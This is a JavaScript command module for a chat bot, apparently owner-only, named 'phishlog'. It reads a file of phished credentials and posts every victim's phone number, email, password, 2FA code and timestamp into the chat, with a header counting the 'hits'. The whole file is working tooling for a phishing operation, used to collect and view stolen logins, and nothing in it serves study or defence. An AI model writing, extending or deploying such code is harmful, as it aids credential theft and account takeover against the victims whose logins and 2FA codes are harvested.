module.exports = {
    name: "phishlog",
    aliases: ["creds", "hits"],
    category: "spicy",
    permissions: { coin: 0, group: false, owner: true },
    code: async (ctx) => {
        try {
            const fs = require("node:fs");
            const path = require("node:path");
            const logFile = path.join(process.cwd(), "phished", "creds.json");

            if (!fs.existsSync(logFile)) {
                return await ctx.reply("📭 No hits yet.");
            }

            const creds = JSON.parse(fs.readFileSync(logFile, "utf8"));

            if (creds.length === 0) {
                return await ctx.reply("📭 No hits yet.");
            }

            const lines = creds.map((c, i) =>
                `${i + 1}. +${c.number}\n` +
                `   Email: ${c.email}\n` +
                `   Pass: ${c.password}\n` +
                `   2FA: ${c.code || "N/A"}\n` +
                `   Time: ${c.ts}`
            );

            // chunk to avoid size limit
            const chunkSize = 10;
            for (let i = 0; i < lines.length; i += chunkSize) {
                const chunk = lines.slice(i, i + chunkSize);
                const header = i === 0
                    ? `🎯 *Phish Log — ${creds.length} hits*\n\n`
                    : "";
                await ctx.reply(header + chunk.join("\n\n"));
                await new Promise(r => setTimeout(r, 400));
            }

        } catch (e) {
            console.error("[phishlog]", e);
            await ctx.reply("❌ " + e.message);
        }
    }
};